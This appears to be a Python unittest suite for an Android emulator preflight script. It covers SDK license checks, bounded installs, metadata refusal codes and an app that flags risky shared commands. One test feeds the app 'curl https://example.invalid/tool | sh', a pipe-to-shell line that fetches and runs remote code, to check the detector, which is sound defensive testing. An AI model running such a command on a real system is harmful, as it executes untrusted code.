"""Refuse unsafe prerequisites without accepting SDK terms or booting a device."""
import importlib.util
import io
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
import urllib.error
import xml.etree.ElementTree as ET
from unittest import mock

ROOT=Path(__file__).resolve().parents[1]
spec=importlib.util.spec_from_file_location('android_preflight',ROOT/'scripts/verify-android-emulator.py')
module=importlib.util.module_from_spec(spec);spec.loader.exec_module(module)


class ExistingLicense(unittest.TestCase):
    def setUp(self):
        self.temp=tempfile.TemporaryDirectory();self.addCleanup(self.temp.cleanup)
        self.path=Path(self.temp.name)/'record'

    def test_reads_existing_hashes_without_rewriting(self):
        raw=b'\n'+b'a'*40+b'\n'+b'b'*40+b'\n'
        self.path.write_bytes(raw)
        self.assertEqual(module.existing_license_record(self.path),raw)
        self.assertEqual(self.path.read_bytes(),raw)

    def test_missing_empty_malformed_oversized_and_directory_refuse(self):
        with self.assertRaises(OSError):module.existing_license_record(self.path)
        for raw in [b'',b'\n',b'not-an-acceptance-record',b'a'*8193,b'\xff']:
            self.path.write_bytes(raw)
            with self.assertRaises((OSError,ValueError,UnicodeError)):
                module.existing_license_record(self.path)
        self.path.unlink();self.path.mkdir()
        with self.assertRaises((OSError,ValueError)):module.existing_license_record(self.path)

    def test_link_and_fifo_refuse_without_blocking_or_changing_target(self):
        target=Path(self.temp.name)/'owned';target.write_bytes(b'a'*40+b'\n')
        self.path.symlink_to(target)
        with self.assertRaises(OSError):module.existing_license_record(self.path)
        self.path.unlink();os.mkfifo(self.path)
        with self.assertRaises(ValueError):module.existing_license_record(self.path)
        self.assertEqual(target.read_bytes(),b'a'*40+b'\n')


class BoundedSdkProcess(unittest.TestCase):
    def test_closed_stdin_and_nonzero_outcome_are_observed(self):
        code,output=module.sdk_install([sys.executable,'-c',
            'import sys;assert sys.stdin.read()=="";print("licenses have not been accepted");sys.exit(7)'])
        self.assertEqual(code,7);self.assertIn(b'not been accepted',output)

    def test_output_limit_refuses_actual_owned_process(self):
        with mock.patch.object(module,'SDK_OUTPUT_LIMIT',32):
            with self.assertRaisesRegex(ValueError,'diagnostics exceeded'):
                module.sdk_install([sys.executable,'-c','print("x"*10000)'])

    def test_deadline_refuses_actual_owned_process(self):
        with mock.patch.object(module,'SDK_TIMEOUT_SECONDS',.1):
            with self.assertRaisesRegex(ValueError,'timeout'):
                module.sdk_install([sys.executable,'-c','import time;time.sleep(10)'])

    def test_normal_reap_does_not_signal_a_reusable_group_number(self):
        with mock.patch.object(module.os,'killpg',side_effect=AssertionError('No post-reap signal')):
            self.assertEqual(module.sdk_install([sys.executable,'-c','print("done")']),(0,b'done\n'))

    def test_post_reap_wait_error_does_not_signal_a_reusable_group_number(self):
        original=subprocess.Popen.wait
        raised=[]
        def wait(process,*args,**kwargs):
            code=original(process,*args,**kwargs)
            if not raised:
                raised.append(True)
                raise OSError('Synthetic error after actual owned child reap')
            return code
        with mock.patch.object(subprocess.Popen,'wait',wait),mock.patch.object(module.os,'killpg',side_effect=AssertionError('No post-reap signal')):
            with self.assertRaisesRegex(OSError,'after actual owned child reap'):
                module.sdk_install([sys.executable,'-c','print("done")'])


class ReviewedMetadata(unittest.TestCase):
    def setUp(self):
        self.package='emulator';self.expected=module.PACKAGES[self.package]
        self.license='synthetic reviewed license'
        self.hash_patch=mock.patch.object(module,'LICENSE_HASH',module.hashlib.sha1(self.license.encode()).hexdigest())
        self.hash_patch.start();self.addCleanup(self.hash_patch.stop)

    def xml(self):
        _,revision,name,size,checksum=self.expected
        root=ET.Element('repository')
        ET.SubElement(root,'license',id='android-sdk-license').text=self.license
        package=ET.SubElement(root,'remotePackage',path=self.package)
        ET.SubElement(package,'channelRef',ref='channel-0')
        rev=ET.SubElement(package,'revision')
        for tag,value in zip(['major','minor','micro'],revision.split('.')):ET.SubElement(rev,tag).text=value
        ET.SubElement(package,'uses-license',ref='android-sdk-license')
        archive=ET.SubElement(ET.SubElement(package,'archives'),'archive')
        ET.SubElement(archive,'host-os').text='linux'
        complete=ET.SubElement(archive,'complete')
        for tag,value in [('url',name),('size',str(size)),('checksum',checksum)]:ET.SubElement(complete,tag).text=value
        return root

    def call(self,raw=None,status=200,url=None,error=None):
        response=io.BytesIO(ET.tostring(self.xml()) if raw is None else raw)
        response.status=status;response.geturl=lambda:url or module.GOOGLE_REPOSITORY+self.expected[0]
        opener=mock.Mock();opener.open.side_effect=error;opener.open.return_value=response
        with mock.patch.object(module.urllib.request,'build_opener',return_value=opener):
            result=module.require_metadata_identity(self.package,self.expected)
        opener.open.assert_called_once_with(module.GOOGLE_REPOSITORY+self.expected[0],timeout=15)
        return result

    def refused(self,code,**kwargs):
        with self.assertRaises(module.MetadataRefusal) as raised:self.call(**kwargs)
        self.assertEqual(str(raised.exception),code);self.assertEqual(raised.exception.code,code)

    def test_matching_identity_returns_only_bound_observation(self):
        raw=ET.tostring(self.xml());result=self.call(raw)
        self.assertEqual(result,{'package':'emulator','metadata_sha256':module.hashlib.sha256(raw).hexdigest(),
            'metadata_bytes':len(raw),'revision':self.expected[1],'license_sha1':module.LICENSE_HASH})

    def test_http_status_and_transport_have_fixed_codes(self):
        self.refused('metadata_http_status',status=503)
        self.refused('metadata_http_status',error=urllib.error.HTTPError('private-canary',404,'private-canary',{},None))
        for error in [urllib.error.URLError('private-canary'),ConnectionResetError('private-canary'),TimeoutError('private-canary')]:
            self.refused('metadata_transport',error=error)

    def test_redirect_is_refused_before_follow_and_after_response(self):
        self.refused('metadata_redirect',url='https://example.invalid/private-canary')
        handler=module.RejectMetadataRedirect()
        with self.assertRaisesRegex(module.MetadataRefusal,'^metadata_redirect$'):
            handler.redirect_request(None,None,302,'private-canary',{},'https://example.invalid/private-canary')

    def test_read_is_capped_and_oversize_refuses(self):
        class Response(io.BytesIO):
            status=200
            def geturl(inner):return module.GOOGLE_REPOSITORY+self.expected[0]
            def read(inner,limit):
                self.assertEqual(limit,module.METADATA_LIMIT+1)
                return b'x'*limit
        opener=mock.Mock();opener.open.return_value=Response()
        with mock.patch.object(module.urllib.request,'build_opener',return_value=opener):
            with self.assertRaisesRegex(module.MetadataRefusal,'^metadata_size$'):
                module.require_metadata_identity(self.package,self.expected)

    def test_invalid_xml_or_missing_revision_structure_is_parse(self):
        self.refused('metadata_parse',raw=b'<private-canary')
        for variant in ['missing','empty','empty-child']:
            root=self.xml();package=root.find('remotePackage');rev=package.find('revision')
            if variant=='missing':package.remove(rev)
            elif variant=='empty':rev.clear()
            else:rev[0].text=None
            self.refused('metadata_parse',raw=ET.tostring(root))

    def test_license_text_and_selected_reference_refuse(self):
        for variant in ['text','missing','ref']:
            root=self.xml();package=root.find('remotePackage')
            if variant=='text':root.find('license').text='changed'
            elif variant=='missing':package.remove(package.find('uses-license'))
            else:package.find('uses-license').set('ref','other')
            self.refused('metadata_license_drift',raw=ET.tostring(root))

    def test_stable_package_ambiguity_or_absence_refuses(self):
        for variant in ['duplicate','preview','missing']:
            root=self.xml();package=root.find('remotePackage')
            if variant=='duplicate':root.append(ET.fromstring(ET.tostring(package)))
            elif variant=='preview':package.find('channelRef').set('ref','channel-1')
            else:root.remove(package)
            self.refused('metadata_package_drift',raw=ET.tostring(root))

    def test_revision_and_archive_drift_are_separate(self):
        root=self.xml();root.find('remotePackage/revision/major').text='999'
        self.refused('metadata_revision_drift',raw=ET.tostring(root))
        for field in ['url','size','checksum']:
            root=self.xml();root.find('remotePackage/archives/archive/complete/'+field).text='changed'
            self.refused('metadata_archive_drift',raw=ET.tostring(root))
        root=self.xml();archive=root.find('remotePackage/archives/archive');archive.remove(archive.find('complete'))
        self.refused('metadata_archive_drift',raw=ET.tostring(root))

    def test_every_fixed_code_survives_main_without_private_details(self):
        with tempfile.TemporaryDirectory() as temp:
            for code in sorted(module.MetadataRefusal.CODES):
                with mock.patch.object(module,'ROOT',Path(temp)),mock.patch.object(sys,'argv',['verify','--sdk-root',temp,'--apk','private-canary']),mock.patch.object(module,'prepare_emulator',side_effect=module.MetadataRefusal(code)),mock.patch('sys.stdout',new_callable=io.StringIO) as out:
                    self.assertEqual(module.main(),1)
                report=json.loads(out.getvalue())
                self.assertFalse(report['pass']);self.assertEqual(report['status'],'FAILED')
                self.assertEqual(report['cases'],[]);self.assertEqual(report['diagnostic_code'],code)
                self.assertNotIn('private-canary',out.getvalue());self.assertNotIn(temp,out.getvalue())
                self.assertEqual(report,json.loads((Path(temp)/'output/android-share/emulator.json').read_text()))

    def test_unknown_diagnostic_cannot_be_published(self):
        with self.assertRaisesRegex(ValueError,'^Invalid metadata diagnostic code$'):
            module.MetadataRefusal('private-canary')


class ManagerAcceptance(unittest.TestCase):
    def setUp(self):
        self.temp=tempfile.TemporaryDirectory();self.addCleanup(self.temp.cleanup)
        self.sdk=Path(self.temp.name);self.report={}
        for name in ['cmdline-tools/latest/bin/sdkmanager','cmdline-tools/latest/bin/avdmanager','platform-tools/adb']:
            p=self.sdk/name;p.parent.mkdir(parents=True,exist_ok=True);p.write_text('#!/bin/sh\nexit 1\n');p.chmod(0o700)
        self.license=self.sdk/'licenses/android-sdk-license';self.license.parent.mkdir()
        self.original=b'a'*40+b'\n';self.license.write_bytes(self.original)
        access=os.access;exists=Path.exists
        self.enter(mock.patch.dict(os.environ,{'GITHUB_ACTIONS':'true','AITRUST_ANDROID_RUNNER':'github-hosted','RUNNER_OS':'Linux'}))
        self.enter(mock.patch.object(module.os,'access',side_effect=lambda p,m:True if str(p)=='/dev/kvm' else access(p,m)))
        self.enter(mock.patch.object(module.Path,'exists',lambda p:True if str(p)=='/dev/kvm' else exists(p)))
        self.enter(mock.patch.object(module.shutil,'disk_usage',return_value=type('Disk',(),{'free':20*1024**3})()))
        self.enter(mock.patch.object(module,'require_metadata_identity'))

    def enter(self,patch):
        value=patch.start();self.addCleanup(patch.stop);return value

    def test_metadata_refusal_never_starts_sdk_install(self):
        install=self.enter(mock.patch.object(module,'sdk_install',side_effect=AssertionError('must not install')))
        with mock.patch.object(module,'require_metadata_identity',side_effect=module.MetadataRefusal('metadata_revision_drift')):
            with self.assertRaisesRegex(module.MetadataRefusal,'^metadata_revision_drift$'):
                module.prepare_emulator(self.sdk,self.report)
        self.assertEqual(self.report['phase'],'reviewed_metadata');install.assert_not_called()
        self.assertEqual(self.license.read_bytes(),self.original)

    def test_manager_license_refusal_is_unavailable_not_executed(self):
        install=self.enter(mock.patch.object(module,'sdk_install',return_value=(1,b'License for package Android Emulator not accepted.')))
        self.assertIsNone(module.prepare_emulator(self.sdk,self.report))
        self.assertEqual(self.report['missing_prerequisites'],['existing_sdk_license_acceptance'])
        self.assertTrue(self.report['license_record_unchanged'])
        self.assertFalse(self.report['sdk_license_acceptance_inferred_from_metadata_hash'])
        self.assertEqual(self.license.read_bytes(),self.original);install.assert_called_once()

    def test_explicit_refusal_is_unavailable_even_with_zero_exit_code(self):
        self.enter(mock.patch.object(module,'sdk_install',return_value=(0,b'License for package Android Emulator not accepted.')))
        self.assertIsNone(module.prepare_emulator(self.sdk,self.report))
        self.assertEqual(self.report['missing_prerequisites'],['existing_sdk_license_acceptance'])
        self.assertTrue(self.report['license_record_unchanged'])

    def test_unrelated_install_failure_fails(self):
        self.enter(mock.patch.object(module,'sdk_install',return_value=(1,b'HTTP archive download failed')))
        with self.assertRaisesRegex(ValueError,'install failed'):
            module.prepare_emulator(self.sdk,self.report)
        self.assertTrue(self.report['license_record_unchanged'])

    def test_license_change_refuses_on_success_and_failure(self):
        for code in [0,1]:
            self.license.write_bytes(self.original)
            def install(argv):
                self.license.write_bytes(b'b'*40+b'\n');return code,b'licenses have not been accepted'
            with mock.patch.object(module,'sdk_install',side_effect=install):
                with self.assertRaisesRegex(ValueError,'record changed'):
                    module.prepare_emulator(self.sdk,{})

    def test_license_change_refuses_even_if_installer_raises(self):
        def install(argv):
            self.license.write_bytes(b'b'*40+b'\n');raise ValueError('timeout')
        with mock.patch.object(module,'sdk_install',side_effect=install):
            with self.assertRaisesRegex(ValueError,'record changed'):
                module.prepare_emulator(self.sdk,{})

    def test_manager_can_admit_preexisting_record_without_matching_xml_hash(self):
        def install(argv):
            executable=self.sdk/'emulator/emulator';executable.parent.mkdir();executable.write_text('synthetic');executable.chmod(0o700)
            (executable.parent/'source.properties').write_text('Pkg.Revision = '+module.PACKAGES['emulator'][1]+'\n')
            image=self.sdk/'system-images/android-36/default/x86_64/system.img';image.parent.mkdir(parents=True);image.write_bytes(b'synthetic')
            (image.parent/'source.properties').write_text('Pkg.Revision = '+module.PACKAGES[module.IMAGE][1]+'\n')
            return 0,b'Complete'
        with mock.patch.object(module,'sdk_install',side_effect=install):
            self.assertIsNotNone(module.prepare_emulator(self.sdk,self.report))
        self.assertFalse(self.report['prerequisites']['metadata_license_hash_recorded'])
        self.assertTrue(self.report['license_record_unchanged'])

    def test_nonhosted_runner_does_not_install(self):
        install=self.enter(mock.patch.object(module,'sdk_install',side_effect=AssertionError('must not install')))
        with mock.patch.dict(os.environ,{'AITRUST_ANDROID_RUNNER':'self-hosted'}):
            self.assertIsNone(module.prepare_emulator(self.sdk,self.report))
        self.assertIn('github_hosted_linux',self.report['missing_prerequisites']);install.assert_not_called()


class EarlyShareDiagnostics(unittest.TestCase):
    CASES=['receive_requires_explicit_check','actual_offline_ps_finding','edit_hides_previous_finding',
           'new_share_and_no_finding','unsupported_mime_has_no_verdict','clear_removes_input_and_result']

    def control(self,failure=None):
        report={};cases=[];calls=[]
        def maybe_fail():
            if report['control_stage']==failure:
                raise subprocess.CalledProcessError(9,['PRIVATE_COMMAND_CANARY'],b'PRIVATE_OUTPUT_CANARY',b'PRIVATE_ERROR_CANARY')
        def send(*args):calls.append(('send',*args));maybe_fail()
        def shell(args):calls.append(('shell',args));maybe_fail()
        def click(view,rid):calls.append(('click',rid));maybe_fail()
        def wait(predicate):
            stage=report['control_stage'];calls.append(('wait',stage));maybe_fail()
            status={'share_first_receive':'Text received. Review it, then tap Check.',
                'share_finding_view':'Review before running this command.',
                'share_edit_view':'Text changed. Tap Check for a new result.',
                'share_replacement_receive':'Text received. Review it, then tap Check.',
                'share_replacement_view':'No supported command pattern found.',
                'share_mime_view':'Files and multiple items are not supported.',
                'share_clear_receive':'Text received. Review it, then tap Check.',
                'share_clear_view':'Cleared. Your text and result are no longer shown.'}[stage]
            view=ET.Element('hierarchy')
            ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/status','text':status})
            editor='printf hello' if failure=='share_clear_text_absence' and stage=='share_clear_view' else ''
            ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/editor','text':editor})
            if stage=='share_finding_view' and failure!='share_finding_tag' or stage=='share_edit_view' and failure=='share_edit_tag_absence':
                ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/tag','text':'PS'})
            if stage=='share_first_receive' and failure=='share_explicit_check':
                ET.SubElement(view,'node',{'text':'Review before running this command.'})
            report['last_ui_observation']=module.owned_ui_observation(view)
            self.assertTrue(predicate(view));return view
        try:module.verify_share_controls(send,shell,wait,click,report,cases)
        except module.AndroidControlRefusal as error:return report,cases,calls,error
        return report,cases,calls,None

    def test_original_six_case_order_and_exact_calls_are_preserved(self):
        report,cases,calls,error=self.control();self.assertIsNone(error)
        self.assertEqual(cases,[{'case':name,'pass':True} for name in self.CASES])
        self.assertEqual(calls,[
            ('send','curl https://example.invalid/tool | sh'),('wait','share_first_receive'),
            ('click','check'),('wait','share_finding_view'),('click','editor'),('shell',['input','text','X']),
            ('wait','share_edit_view'),('send','printf hello'),('wait','share_replacement_receive'),
            ('click','check'),('wait','share_replacement_view'),('send','ignored','image/png'),
            ('wait','share_mime_view'),('send','printf hello'),('wait','share_clear_receive'),
            ('click','clear'),('wait','share_clear_view')])
        self.assertEqual(report['control_stage'],'share_clear_text_absence')

    def test_every_early_stage_refuses_with_exact_completed_prefix(self):
        prefixes={'share_first_send':0,'share_first_receive':0,'share_explicit_check':0,
            'share_finding_tap':1,'share_finding_view':1,'share_finding_tag':1,
            'share_edit':2,'share_edit_view':2,'share_edit_tag_absence':2,
            'share_replacement_send':3,'share_replacement_receive':3,'share_replacement_tap':3,'share_replacement_view':3,
            'share_mime_send':4,'share_mime_view':4,'share_clear_send':5,'share_clear_receive':5,
            'share_clear_tap':5,'share_clear_view':5,'share_clear_text_absence':5}
        self.assertEqual(set(prefixes),{s for s in module.AndroidControlRefusal.STAGES if s.startswith('share_')})
        for stage,prefix in prefixes.items():
            report,cases,calls,error=self.control(stage)
            self.assertIsInstance(error,module.AndroidControlRefusal)
            self.assertEqual(error.code,module.AndroidControlRefusal.STAGES[stage])
            self.assertEqual(report['control_stage'],stage)
            self.assertEqual(cases,[{'case':name,'pass':True} for name in self.CASES[:prefix]])
            self.assertNotIn('PRIVATE_',json.dumps(report)+str(error))

    def test_last_view_observation_contains_only_fixed_booleans(self):
        view=ET.Element('hierarchy')
        ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/editor','text':'PRIVATE_SUBJECT_CANARY /private/example?token=PRIVATE_TOKEN'})
        ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/status','text':'Ready when you are.'})
        ET.SubElement(view,'node',{'package':'com.android.launcher3','text':'PRIVATE_OTHER_APP_CANARY'})
        ET.SubElement(view,'node',{'package':'com.android.systemui','text':'PRIVATE_LOCKSCREEN_CANARY'})
        ET.SubElement(view,'node',{'resource-id':'android:id/aerr_close','text':'PRIVATE_ERROR_CANARY'})
        result=module.owned_ui_observation(view)
        self.assertTrue(all(type(v) is bool for v in result.values()))
        self.assertTrue(result['owned_ui_present'] and result['owned_editor_present'] and result['owned_editor_nonempty'])
        self.assertTrue(result['ready_text_present'] and result['launcher_ui_present'] and result['system_ui_present'] and result['platform_error_dialog_present'])
        self.assertFalse(result['received_text_present'] or result['first_synthetic_text_present'] or result['tag_ps_present'])
        self.assertNotIn('PRIVATE_',json.dumps(result));self.assertNotIn('/private',json.dumps(result))

    def test_empty_or_other_app_view_is_observed_not_a_fake_app_success(self):
        view=ET.fromstring('<hierarchy><node package="other.example" text="PRIVATE_OTHER_APP_CANARY"/></hierarchy>')
        self.assertTrue(all(v is False for v in module.owned_ui_observation(view).values()))

    def test_start_output_has_only_fixed_hints_not_private_details_or_success(self):
        raw=('Status: timeout\nActivity: '+module.COMPONENT+'\nWarning: PRIVATE_WARNING /private/file\nError: PRIVATE_TOKEN https://example.invalid/private\n').encode()
        result=module.share_start_observation(raw)
        self.assertEqual(result,{'status_ok_reported':False,'status_timeout_reported':True,
            'error_reported':True,'warning_reported':True,'owned_component_reported':True})
        self.assertTrue(all(type(v) is bool for v in result.values()))
        self.assertNotIn('PRIVATE_',json.dumps(result));self.assertNotIn('/private',json.dumps(result))
        self.assertTrue(module.share_start_observation(b'Status: ok\r\n')['status_ok_reported'])
        self.assertTrue(all(v is False for v in module.share_start_observation(b'\xffPRIVATE_UNKNOWN_NATIVE_OUTPUT').values()))

    def test_real_main_distinguishes_first_send_and_existing_dump_read_parse_failures(self):
        for operation in ['send','dump','read','parse']:
            with tempfile.TemporaryDirectory() as temporary:
                home=Path(temporary);fake_process=mock.Mock();fake_process.poll.return_value=None;fake_process.wait.return_value=0
                def run(argv,**kwargs):
                    result=subprocess.CompletedProcess(argv,0,b'',b'')
                    if 'shell' not in argv:return result
                    command=argv[-1]
                    if command=='getprop sys.boot_completed':result.stdout=b'1'
                    elif command.startswith('am start'):
                        if operation=='send':result.returncode=1
                        else:result.stdout=b'Status: timeout\nPRIVATE_NATIVE_CANARY\n'
                    elif command.startswith('uiautomator dump') and operation=='dump':result.returncode=1
                    elif command.startswith('cat '):
                        if operation=='read':result.returncode=1
                        else:result.stdout=b'<PRIVATE_XML_CANARY'
                    return result
                def prepare(sdk,report):
                    report['share_start_observation']={'status_ok_reported':True}
                    return home/'adb',home/'emulator',home/'avdmanager'
                with mock.patch.object(module,'ROOT',home),mock.patch.object(sys,'argv',['verify','--sdk-root',temporary,'--apk','PRIVATE_APK_CANARY']),mock.patch.dict(os.environ,{'RUNNER_TEMP':temporary}),mock.patch.object(module,'prepare_emulator',side_effect=prepare),mock.patch.object(module.subprocess,'Popen',return_value=fake_process),mock.patch.object(module.subprocess,'run',side_effect=run),mock.patch('sys.stdout',new_callable=io.StringIO) as out:
                    self.assertEqual(module.main(),1)
                report=json.loads(out.getvalue())
                self.assertEqual(report['diagnostic_code'],'share_first_send_unavailable' if operation=='send' else 'share_first_receive_unavailable')
                self.assertEqual(report['cases'],[]);self.assertEqual(report['status'],'FAILED');self.assertFalse(report['pass'])
                if operation=='send':
                    self.assertNotIn('ui_operation',report)
                    self.assertNotIn('share_start_observation',report)
                else:
                    self.assertEqual(report['ui_operation'],operation)
                    self.assertTrue(report['share_start_observation']['status_timeout_reported'])
                self.assertNotIn('last_ui_observation',report)
                self.assertNotIn('PRIVATE_',out.getvalue());self.assertNotIn(temporary,out.getvalue())
                fake_process.terminate.assert_called_once()


class BackgroundControlDiagnostics(unittest.TestCase):
    def run_control(self,failure=None,final='cleared',tasks=None):
        report={'cases':[{'case':'earlier_control','pass':True}]};calls=[];waits=[]
        def view(status,marker=False):
            root=ET.Element('hierarchy')
            ET.SubElement(root,'node',{'resource-id':module.PACKAGE+':id/status','text':status})
            ET.SubElement(root,'node',{'resource-id':module.PACKAGE+':id/editor','text':'synthetic private marker' if marker else ''})
            return root
        def send(value):
            calls.append(('send',value))
            if failure=='background_receive':raise OSError('PRIVATE_COMMAND_CANARY')
        def shell(argv):
            calls.append(('shell',argv))
            stage=report['control_stage']
            if failure==stage:raise subprocess.CalledProcessError(9,['PRIVATE_COMMAND_CANARY'],b'PRIVATE_OUTPUT_CANARY',b'PRIVATE_ERROR_CANARY')
            if argv==['dumpsys','activity','activities']:
                return tasks if tasks is not None else ('Task{abc #73 type=standard A=10001:'+module.PACKAGE+'}\n').encode()
            return b''
        def wait(predicate):
            waits.append(predicate)
            if len(waits)==1:
                received=view('Text received. Review it, then tap Check.',True)
                self.assertTrue(predicate(received));return received
            if failure=='background_cleared_view':
                self.assertFalse(predicate(view('Unrelated foreground text',True)))
                raise ValueError('PRIVATE_TIMEOUT_CANARY')
            seen=view('Ready when you are.' if final=='ready' else 'Cleared. Your text and result are no longer shown.',final=='marker')
            self.assertTrue(predicate(seen));return seen
        try:module.verify_background_clear(send,shell,wait,report)
        except module.AndroidControlRefusal as error:return report,calls,waits,error
        return report,calls,waits,None

    def test_original_command_order_and_ready_or_cleared_success_are_preserved(self):
        for final in ['ready','cleared']:
            report,calls,waits,error=self.run_control(final=final)
            self.assertIsNone(error);self.assertEqual(len(waits),2)
            self.assertEqual(calls,[('send','synthetic private marker'),
                ('shell',['input','keyevent','KEYCODE_HOME']),
                ('shell',['dumpsys','activity','activities']),('shell',['am','task','focus','73'])])
            self.assertEqual(report['background_owned_task_matches'],1)
            self.assertEqual(report['cases'],[{'case':'earlier_control','pass':True}])
            self.assertEqual(report['control_stage'],'background_marker_absence')
            self.assertEqual(report['background_observation'],{'owned_ui_present':True,'ready_text_present':final=='ready',
                'cleared_text_present':final=='cleared','synthetic_marker_present':False})

    def test_every_command_failure_is_fixed_and_cannot_append_a_pass(self):
        for stage in ['background_receive','background_home','background_task_inventory','background_refocus','background_cleared_view']:
            report,calls,waits,error=self.run_control(failure=stage)
            self.assertIsInstance(error,module.AndroidControlRefusal)
            self.assertEqual(error.code,module.AndroidControlRefusal.STAGES[stage])
            self.assertEqual(str(error),error.code);self.assertTrue(error.__suppress_context__)
            self.assertEqual(report['control_stage'],stage)
            self.assertEqual(report['cases'],[{'case':'earlier_control','pass':True}])
            self.assertNotIn('PRIVATE_',json.dumps(report)+str(error))
        self.assertEqual(report['background_observation'],{'owned_ui_present':True,'ready_text_present':False,
            'cleared_text_present':False,'synthetic_marker_present':True})

    def test_absent_owned_task_refuses_before_focus_without_dump_echo(self):
        report,calls,waits,error=self.run_control(tasks=b'Task{abc #999 A=other.example PRIVATE_DUMP_CANARY}\n')
        self.assertEqual(error.code,'background_owned_task_unavailable');self.assertEqual(report['background_owned_task_matches'],0)
        self.assertFalse(any(call[0]=='shell' and call[1][:3]==['am','task','focus'] for call in calls))
        self.assertNotIn('PRIVATE_DUMP_CANARY',json.dumps(report)+str(error))

    def test_marker_retention_still_refuses_after_cleared_text(self):
        report,calls,waits,error=self.run_control(final='marker')
        self.assertEqual(error.code,'background_marker_retained')
        self.assertTrue(report['background_observation']['synthetic_marker_present'])
        self.assertTrue(report['background_observation']['cleared_text_present'])

    def test_inventory_decode_failure_is_fixed_not_a_false_missing_task(self):
        report,calls,waits,error=self.run_control(tasks=b'\xffPRIVATE_DUMP_CANARY')
        self.assertEqual(error.code,'background_task_inventory_unavailable')
        self.assertNotIn('background_owned_task_matches',report)

    def test_original_first_match_behavior_is_not_changed_by_diagnostics(self):
        tasks=('Task{a #73 A='+module.PACKAGE+'}\nTask{b #74 A='+module.PACKAGE+'}\n').encode()
        report,calls,waits,error=self.run_control(tasks=tasks)
        self.assertIsNone(error);self.assertEqual(report['background_owned_task_matches'],2)
        self.assertEqual(calls[-1],('shell',['am','task','focus','73']))

    def test_fixed_stage_codes_reach_main_without_private_details(self):
        with tempfile.TemporaryDirectory() as temp:
            for stage,code in module.AndroidControlRefusal.STAGES.items():
                def refuse(sdk,report):
                    report['phase']='share_controls';report['control_stage']=stage
                    raise module.AndroidControlRefusal(stage)
                with mock.patch.object(module,'ROOT',Path(temp)),mock.patch.object(sys,'argv',['verify','--sdk-root',temp,'--apk','PRIVATE_ARG_CANARY']),mock.patch.object(module,'prepare_emulator',side_effect=refuse),mock.patch('sys.stdout',new_callable=io.StringIO) as out:
                    self.assertEqual(module.main(),1)
                report=json.loads(out.getvalue());self.assertEqual(report['diagnostic_code'],code)
                self.assertEqual(report['phase'],'share_controls');self.assertEqual(report['control_stage'],stage)
                self.assertFalse(report['pass']);self.assertEqual(report['status'],'FAILED');self.assertEqual(report['cases'],[])
                self.assertNotIn('PRIVATE_',out.getvalue());self.assertNotIn(temp,out.getvalue())

    def test_unknown_stage_cannot_be_published(self):
        with self.assertRaisesRegex(ValueError,'^Invalid Android control diagnostic$'):
            module.AndroidControlRefusal('PRIVATE_STAGE_CANARY')


if __name__=='__main__':unittest.main()
